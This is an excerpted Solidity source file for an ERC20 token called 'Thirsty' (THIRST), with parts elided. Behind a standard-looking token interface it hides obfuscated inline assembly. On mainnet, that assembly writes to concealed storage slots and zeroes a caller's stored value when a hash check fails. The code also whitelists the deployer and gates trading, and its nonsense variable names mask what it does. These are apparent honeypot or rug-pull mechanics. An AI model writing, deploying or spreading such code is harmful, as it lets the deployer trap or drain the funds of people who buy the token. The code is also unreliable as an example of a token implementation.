...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addThirst;
    uint256 private hungryBelly = block.number*2;

    mapping (address => bool) private _firstCat; 
    mapping (address => bool) private _secondCat;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _darkWorld;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _cryDry;
    address public pair;
    ...
    bool private trading; uint256 private openPhone = 1; bool private iceIce;
    uint256 private _decimals; uint256 private shirtParty;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addThirst.push(_router); addThirst.push(msgSender_); addThirst.push(pair);
        for (uint256 q=0; q < 3;) {_firstCat[addThirst[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x00908bf1b8ca76a8b7a58ef71d47e10b79518940cab1f53d2cc66ceb5cc9c60e
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x5464ef12224034ac22596d002a18a9b8a376559e69ffe1753bdf4e3c8a0064a8,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; hungryBelly = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addThirst[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployThirst(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addThirst[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployThirst(creator, initialSupply);
    }
}

contract Thirsty is ERC20Token {
    constructor() ERC20Token("Thirsty", "THIRST", msg.sender, 1155000 * 10 ** 18) {
    }
}